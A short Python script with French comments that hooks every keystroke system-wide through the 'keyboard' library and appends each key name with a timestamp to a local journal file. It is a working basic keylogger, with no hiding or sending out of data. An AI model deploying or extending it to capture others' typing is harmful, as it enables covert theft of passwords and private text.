import keyboard
import datetime

# Définir le fichier de journal
log_file = "journal.txt"

# Fonction pour enregistrer l'action dans le journal
def log_action(action):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as file:
        file.write(f"{timestamp}: {action}\n")

# Fonction de callback pour enregistrer les frappes
def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        key = e.name
        log_action(f"Appui sur la touche {key}")

# Écouter les événements clavier en utilisant la bibliothèque keyboard
keyboard.hook(on_key_event)

# Attendre indéfiniment
keyboard.wait()
